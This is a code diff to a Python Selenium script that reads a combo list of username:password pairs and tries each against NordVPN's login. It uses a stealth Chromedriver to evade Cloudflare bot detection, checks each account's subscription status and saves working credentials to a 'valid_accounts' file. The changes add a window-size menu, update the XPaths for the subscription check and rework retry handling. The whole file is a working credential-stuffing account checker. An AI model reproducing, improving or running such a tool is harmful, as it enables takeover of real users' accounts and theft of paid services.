@@ -5,19 +5,34 @@ from urllib.error import ContentTooShortError
 from selenium.common.exceptions import NoSuchElementException
 from selenium.common.exceptions import WebDriverException
 import sys
-
 from pathlib import Path
 from selenium.webdriver.common.by import By
 from header import title
-
-
 
 user = []
 password = []
 retries = 0
 counter = 0
 
-if getattr(sys, 'frozen', False):# and hasattr(sys, 'MEIPASS'):
+while True:
+    print("Window Size (minimum 1200 x 300):")
+    print("1) Small")
+    print("2) Medium")
+    print("3) Large")
+    window_size = int(input("Enter Size: "))
+    match window_size:
+        case 1:
+            window_size = 1200, 300
+            break
+        case 2:
+            window_size = 1200, 500
+            break
+        case 3:
+            window_size = 1200, 800
+            break
+        case _:
+            print("Invalid size")
+if getattr(sys, 'frozen', False):  # and hasattr(sys, 'MEIPASS'):
     user_directory = str(Path(sys.executable).parent) + "\\nord.txt"
     save_directory = str(Path(sys.executable).parent) + "\\valid_accounts"
     os.makedirs(save_directory, exist_ok=True)
@@ -32,7 +47,7 @@ try:
 except FileNotFoundError:
     pass
 try:
-    with open (user_directory, 'r') as combos:
+    with open(user_directory, 'r') as combos:
         for i in combos.readlines():
             user.append(i.split(":")[0])
             password.append(i.split(":")[1].split(" ")[0].strip())
@@ -43,14 +58,15 @@ except FileNotFoundError as e:
 index = 0
 for i in os.listdir(str(Path(__file__).parent)):
     if 'resume' in i:
-        with open('resume_from','r') as read_resume_index:
+        with open('resume_from', 'r') as read_resume_index:
             index = int(read_resume_index.readline())
 title()
 while index != len(user):
     try:
         if retries > 5:
-            print("\n\nToo many errors. \n\nUndetected Chromedriver can't bypass Cloudflare if you are using a "
+            print("\n\nToo many errors. \n\n1) Undetected Chromedriver can't bypass Cloudflare if you are using a "
                   "blacklisted datacenter IP address. If this is the case, try changing your IP and try again. "
+                  "\n\n2) Could be an unknown error related to Chrome Version. Wait a moment, and try again."
                   "\nEnding.")
             exit()
         with open(save_directory + save_file, 'a') as accounts:
@@ -58,12 +74,13 @@ while index != len(user):
             browser_options.add_argument(
                 'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                 'Chrome/116.0.0.0 Safari/537.36')
-            #browser_options.add_argument("--auto-open-devtools-for-tabs")
+            # browser_options.add_argument("--auto-open-devtools-for-tabs")
             # browser_options.add_argument('--headless=new')
             browser = stealthdriver.Chrome(version_main=102)
             page = 'https://www.nordvpn.com/'
-            browser.set_window_size(800, 200)
+            browser.set_window_size(window_size[0], window_size[1])
             browser.get(page)
+            time.sleep(3)
             print('\rTrying Combo {} out of {}'.format(index + 1, len(user)), end='')
             continue_button = browser.find_element(By.XPATH, '//*[@id="js-HeaderV3__mini-nav"]/li[3]/a')
             continue_button.click()
@@ -111,35 +128,36 @@ while index != len(user):
             login_button.click()
             time.sleep(4)
             if 'https://my.nordaccount.com/dashboard/' in browser.current_url:
-                subscription_page = 'https://my.nordaccount.com/billing/my-subscriptions/'
-                browser.get(subscription_page)
-                time.sleep(4)
-                if browser.find_elements(By.XPATH, '//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div/div[1]/p'):
-                    no_sub = browser.find_element(By.XPATH, '//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div/div[1]/p').text
-                    if 'No active subscriptions' in no_sub:
-                        print(" | {}:{} ---> No Active Subscription".format(user[index], password[index]))
-                if browser.find_elements(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div[1]/div/div/div[1]/div[2]/div'):
-                    active_or_expired = browser.find_element(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div[1]/div/div/div[1]/div[2]/div').text
-                    if 'Active' in active_or_expired:
-                        print(" | {}:{} ---> Success!".format(user[index], password[index]))
-                        accounts.write(user[index] + ":" + password[index] + " ---> Valid\n")
-                    else:
-                        print(" | {}:{} ---> Expired!".format(user[index], password[index]))
+                if browser.find_elements(By.XPATH,
+                                         '//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[3]/div/div[1]/div[2]/div[1]/div/div[1]/div[2]/span/div'):
+                    print(" | {}:{} ---> Success! (Expiring Soon)".format(user[index], password[index]))
+                    accounts.write(user[index] + ":" + password[index] + " ---> Valid\n")
+                # if browser.find_elements(By.XPATH, ':
+                # print(" | {}:{} ---> Success!".format(user[index], password[index]))
+                # accounts.write(user[index] + ":" + password[index] + " ---> Valid\n")
+                if browser.find_elements(By.XPATH,
+                                         '//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[3]/div/div[1]/div[1]/div[1]/div/div[1]/div[2]/span/div') or browser.find_elements(
+                        By.XPATH,
+                        '//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[4]/div/div[1]/div[1]/div[1]/div/div[1]/div[2]/span/div'):
+                    print(" | {}:{} ---> Expired!".format(user[index], password[index]))
+                else:
+                    print(" | {}:{} ---> No Subscription on Account".format(user[index], password[index]))
             else:
                 print(" | {}:{} ---> Account not working".format(user[index], password[index]))
             browser.quit()
             index += 1
             retries = 0
     except NoSuchElementException as b:
-        print("Error: No Such Element - Retrying")
+        print(" - Error: No Such Element - Retrying")
         retries += 1
-        browser.quit()
     except WebDriverException as e:
-        print("Error: Web Driver Exception - Retrying")
+        print(" - Error: Web Driver Exception - Retrying")
         retries += 1
-        browser.quit()
+    except NameError:
+        print(" - Error: Connection Error - Retrying")
+        retries += 1
     except ContentTooShortError as c:
-        print("Error: Url Lib Exception - Retrying")
+        print(" - Error: Url Lib Exception - Retrying")
         retries += 1
-        browser.quit()
+
 
